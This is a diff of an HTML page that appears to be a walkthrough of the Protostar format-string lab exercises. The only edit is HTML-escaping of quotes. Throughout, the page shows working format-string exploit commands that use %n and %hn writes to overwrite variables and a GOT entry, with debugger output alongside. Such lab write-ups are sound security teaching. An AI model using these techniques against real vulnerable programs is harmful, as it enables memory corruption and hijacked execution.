@@ -111,7 +111,7 @@
 <p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
 
 <div>
-  <pre><code class='console'>$ ./format0 %64s$(perl -e 'print &quot;\xef\xbe\xad\xde&quot;')
+  <pre><code class='console'>$ ./format0 %64s$(perl -e &#39;print &quot;\xef\xbe\xad\xde&quot;&#39;)
 
 you have hit the target correctly :)</code></pre>
 </div>
@@ -183,7 +183,7 @@ in printf.c
 <p>With a few calculations, we can find the correct offset.</p>
 
 <div>
-  <pre><code class='console'>$ ./format1 $(perl -e 'print &quot;\x38\x96\x04\x08&quot;')'..%128$n'
+  <pre><code class='console'>$ ./format1 $(perl -e &#39;print &quot;\x38\x96\x04\x08&quot;&#39;)&#39;..%128$n&#39;
 8..you have modified the target :)</code></pre>
 </div>
 
@@ -201,7 +201,7 @@ in printf.c
 <p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
 
 <div>
-  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%4\$08x | ./format2
+  <pre><code class='console'>$ echo -ne $(perl -e &#39;print &quot;\xe4\x96\x04\x08&quot;&#39;)%4\$08x | ./format2
 080496e4target is 0 :(</code></pre>
 </div>
 
@@ -209,7 +209,7 @@ in printf.c
 <p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
 
 <div>
-  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%60u%4\$n | ./format2
+  <pre><code class='console'>$ echo -ne $(perl -e &#39;print &quot;\xe4\x96\x04\x08&quot;&#39;)%60u%4\$n | ./format2
                                                          512you have modified the target :)</code></pre>
 </div>
 
@@ -241,7 +241,7 @@ eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
 called by frame at 0xbffff590
 source language c.
 Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
-Locals at 0xbffff568, Previous frame's sp is 0xbffff570
+Locals at 0xbffff568, Previous frame&#39;s sp is 0xbffff570
 Saved registers:
 ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
 (gdb) x/3xw 0xbffff568
@@ -279,7 +279,7 @@ $ echo &quot;ibase=16; 01&quot; | bc
 <p>Finally, we write values to each of the four bytes of <code>target</code>:</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\xf4\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf5\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf6\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf7\x96\x04\x08&quot;')'%52u%12$n%''17u%13$n''%173u%14$n' | ./format3
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\xf4\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf5\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf6\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf7\x96\x04\x08&quot;&#39;)&#39;%52u%12$n%&#39;&#39;17u%13$n&#39;&#39;%173u%14$n&#39; | ./format3
 ���                                                   0       3221222848                                                                                                                                                                   3086839796
 you have modified the target :))</code></pre>
 </div>
@@ -294,7 +294,7 @@ you have modified the target :))</code></pre>
 <p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>
 
 <div>
-  <pre><code class='console'>$ echo 'AAAA%4$x' | ./format4
+  <pre><code class='console'>$ echo &#39;AAAA%4$x&#39; | ./format4
 AAAA41414141</code></pre>
 </div>
 
@@ -315,7 +315,7 @@ $ objdump -t format4 | grep hello
 <p>To confirm that our overwrite works correctly, we run a quick test:</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%4$n' &gt; /tmp/format4
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\x24\x97\x04\x08&quot;&#39;)&#39;%4$n&#39; &gt; /tmp/format4
 $ gdb -q format4
 Reading symbols from /opt/protostar/bin/format4...done.
 (gdb) run &lt; /tmp/format4
@@ -329,7 +329,7 @@ Program received signal SIGSEGV, Segmentation fault.
 <p>Execution jumped to the address <code>0x00000004</code>, meaning that we&rsquo;re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> &mdash; only the last two bytes need to be changed.</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%33968u%4$hn' | ./format4
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\x24\x97\x04\x08&quot;&#39;)&#39;%33968u%4$hn&#39; | ./format4
 $
 &lt;lots of whitespace&gt;
 512
